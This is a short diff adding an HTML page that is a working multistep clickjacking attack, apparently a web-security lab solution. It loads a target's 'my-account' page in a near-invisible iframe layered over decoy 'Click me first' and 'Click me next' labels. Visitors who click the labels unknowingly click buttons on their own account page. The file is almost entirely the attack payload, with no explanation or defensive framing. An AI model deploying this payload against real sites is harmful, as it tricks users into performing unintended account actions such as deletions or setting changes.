@@ -1,0 +1,25 @@
+<style>
+    iframe {
+        position:relative;
+        width: 500px;
+        height: 700px;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top: 500px;
+        left:60px;
+        z-index: 1;
+    }
+    .one{
+        position:absolute;
+        top: 295px;
+        left:220px;
+        z-index: 1;
+    }
+ </style>
+ <div>Click me first</div>
+ <div class="one">Click me next</div>
+
+<iframe src="victim-URL/my-account" ></iframe>
